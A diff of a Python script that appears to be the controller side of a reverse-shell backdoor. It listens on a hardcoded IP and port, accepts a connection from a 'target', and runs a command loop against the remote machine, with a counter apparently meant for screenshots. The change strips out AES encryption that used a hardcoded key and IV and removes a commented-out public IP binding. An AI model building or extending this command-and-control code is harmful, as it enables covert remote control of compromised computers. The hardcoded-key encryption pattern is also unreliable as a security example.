@@ -4,34 +4,24 @@
 import socket
 import json
 import base64
-from Crypto.Cipher import AES
-def do_encrypt(message):
-    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
-    ciphertext = obj.encrypt(message)
-    return ciphertext
 
-def do_decrypt(ciphertext):
-    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
-    message = obj2.decrypt(ciphertext)
-    return message
 
-countshot = 1
+countshot = 1 
+# Send and receive function 
 def send(data):
 	json_data = json.dumps(data)
-	cipherdata = do_encrypt(json_data)
-	target.send(cipherdata)
+	target.send(data)
 
 def recv():
 	data = ""
 	while True:
 		try:
 			data = data + target.recv(1024)
-			text = do_decrypt(data)
-			return json.loads(text) 
+			return json.loads(data)
 		except ValueError:
 		       continue 
 
-
+# The shell commands
 def shell():
 	global countshot
 	while True:
@@ -63,14 +53,13 @@ def shell():
 		else: 
 			result = recv()
 			print(result)
-
+#All the server function 
 def server():
 	global sock
 	global ip
 	global target
 	sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	#sock.bind(('100.20.118.82',54436))
 	sock.bind((' 172.31.20.248', 54436))
 	sock.listen(15)
 	print("[+] Listening FOR")
@@ -80,7 +69,6 @@ def server():
 
 
 server()
-
 shell()
 sock.close()
 
